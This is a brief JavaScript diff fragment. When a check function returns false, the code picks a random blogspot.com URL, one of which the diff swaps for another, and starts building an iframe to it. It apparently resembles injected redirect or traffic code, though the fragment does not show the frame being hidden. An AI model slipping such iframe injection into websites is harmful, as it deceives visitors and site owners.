@@ -12,7 +12,7 @@ function ucheck(){
           }
 }
 if(ucheck() === false){
-    var itemb = ["https://mnblank.blogspot.com",
+    var itemb = ["https://zadioklap.blogspot.com",
 		 "https://mnblank.blogspot.com"];
     var itemc = itemb[Math.floor(Math.random()*itemb.length)];
     var iframe = document.createElement('iframe');
